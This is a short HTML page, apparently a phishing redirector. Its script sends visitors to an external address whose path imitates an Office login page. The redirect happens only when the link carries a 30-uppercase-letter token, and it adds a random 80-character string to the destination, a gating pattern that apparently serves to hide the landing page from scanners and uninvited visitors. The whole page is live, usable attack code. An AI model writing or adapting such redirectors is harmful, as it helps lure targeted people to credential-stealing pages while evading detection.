<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <script>
        // Target redirect URL
        const redirectTo = "https://iw.kicgqpj2.sa.com/m3.live/office-3D8/index.php";

        // Function to generate a random string of mixed characters (80 characters)
        function generateRandomString(length) {
            const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            let result = "";
            for (let i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() * characters.length));
            }
            return result;
        }

        // Function to extract the unnamed query parameter after '?='
        function getUnnamedQueryParam() {
            const query = window.location.search;
            const match = query.match(/^\?=([A-Z]{30})$/); // Matches "?=30-uppercase-letters"
            return match ? match[1] : null;
        }

        // Extract and validate the 30-character uppercase string from the URL
        const upperString = getUnnamedQueryParam();

        if (upperString) {
            // Generate a random 80-character string
            const randomString = generateRandomString(80);

            // Redirect with the format "?=80CHARACTERSLONG"
            const newUrl = `${redirectTo}?=${randomString}`;
            console.log("Redirecting to:", newUrl);  // Debugging log
            window.location.href = newUrl;
        } else {
            // Show error message if format is incorrect
            document.body.innerHTML = "<p>Invalid URL format. Please use '?=30UPPERCASELETTERS'.</p>";
        }
    </script>
</head>
<body>
    <p>Redirecting you to the new page...</p>
</body>
</html>
